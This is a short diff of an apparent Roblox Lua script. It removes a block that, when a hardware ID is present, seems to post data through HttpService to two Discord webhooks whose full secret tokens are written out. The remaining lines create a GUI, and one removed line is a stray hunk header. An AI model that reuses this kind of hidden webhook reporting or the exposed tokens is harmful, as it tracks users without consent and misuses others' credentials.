@@ -1,15 +1,4 @@
 
-if hwid then
-local HttpServ = game:GetService('HttpService')
-local url = "https://discordapp.com/api/webhooks/937154192605331456/lLvkhH_EOV62PYk0yb8RGj-20FoX07kp6lyrJB2qlhrgDUKOqDv-QB9h7psojKCfLT3E"
-local url = "https://discord.com/api/webhooks/966868554739777546/NhS69sF7xLIrWhuCdpA5TsF115pjow2meqxLWZOfLZYawEvJTqtR9qboJ3vPiUDPcirp"
-
-
-local data = 
-@@ -107,53 +107,129 @@ local data =
-end
-
-
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
